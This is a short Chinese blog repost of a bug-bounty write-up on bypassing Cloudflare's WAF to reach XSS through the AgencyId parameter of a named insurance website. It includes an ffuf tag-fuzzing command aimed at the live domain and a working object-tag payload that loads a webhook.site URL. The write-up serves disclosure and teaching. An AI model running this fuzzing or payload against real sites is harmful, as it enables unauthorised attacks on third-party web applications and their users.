> **原文链接**: https://mp.weixin.qq.com/s?__biz=MjM5Mzc4MzUzMQ==&mid=2650261410&idx=1&sn=2635358d53df0250ae5cb8d795b1e3d0

#  一则绕过 Cloudflare WAF 实现 XSS 的案例  
骨哥说事  骨哥说事   2025-07-15 04:07  
  
<table><tbody><tr><td data-colwidth="557" width="557" valign="top" style="word-break: break-all;"><h1 data-selectable-paragraph="" style="white-space: normal;outline: 0px;max-width: 100%;font-family: -apple-system, system-ui, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;overflow-wrap: break-word !important;"><strong style="outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="color: rgb(255, 0, 0);"><strong><span style="font-size: 15px;"><span leaf="">声明：</span></span></strong></span><span style="font-size: 15px;"></span></span></strong><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="font-size: 15px;"><span leaf="">文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。</span></span></span></h1></td></tr></tbody></table>#   
  
#   
  
****# 防走失：https://gugesay.com/archives/4544  
  
******不想错过任何消息？设置星标****↓ ↓ ↓**  
****  
#   
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlbXyV4tJfwXpicwdZ2gTB6XtwoqRvbaCy3UgU1Upgn094oibelRBGyMs5GgicFKNkW1f62QPCwGwKxA/640?wx_fmt=png&from=appmsg "")  
  
通过前期侦察，白帽小哥发现一处页面在 HTML 渲染时没有对AgencyId 参数的输入进行有效清理：  
  
![file](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlIzT5btU7rz8SKJyvCZdkib2CdOcFhADNtxJMOyib3SrSFXAH05Sotj4rIvicJksfx4gHq93LB5Ij1g/640?wx_fmt=png&from=appmsg "")  
  
  
但是很不幸设置 iframe 的源会触发 WAF 拦截，在尝试包含
```
<script>
```

  
和
```
<img>
```

  
标签时，同样会发生拦截。  
  
![file](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlIzT5btU7rz8SKJyvCZdkibA7n8gYtXAc7ZVnjuLBMFauKiccVBLZbt0iaxNCm1FBIeW9vQDD0PIHPg/640?wx_fmt=png&from=appmsg "")  
  
  
白帽小哥尝试使用参数污染‘走私’源代码，但同样被阻止。  
  
为了搜索潜在标签，小哥尝试对主页进行模糊测试：  

```
> ffuf -u 'https://www.blueinsurance.ie/<FUZZ>' -c -w /usr/share/seclists/Miscellaneous/Web/html-tags.txt -mc all -fc 403 -rate 5

```

  
很幸运，大多数 WAF 的默认设置并不好，可以通过使用
```
<object>
```

  
标签进行绕过。  

```
<object data=https://webhook.site/XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX>

```

  
![file](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlIzT5btU7rz8SKJyvCZdkibaJK4EOJx4zlb6FlXHcY5m62gKU8y2DZqCXsRPBLEuGsCspyg34El3w/640?wx_fmt=png&from=appmsg "")  
  
  
你学到了么？  
  
原文：https://infosecwriteups.com/xss-with-cloudflare-waf-bypass-zurich-insurance-4cdfc05b6e2d  
  
- END -  
  
**加入星球，随时交流：**  
  
**********（会员统一定价）：128元/年（0.35元/天）******  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hZj512NN8jnMJtHJnShkTnh3vR3fmaqicPicANic6OEsobrpRjx5vG6mMTib1icuPmuG74h2bxC4eP6nMMzbs5QaSlw/640?wx_fmt=jpeg&from=appmsg "")  
  
**感谢阅读，如果觉得还不错的话，欢迎分享给更多喜爱的朋友～**  
  
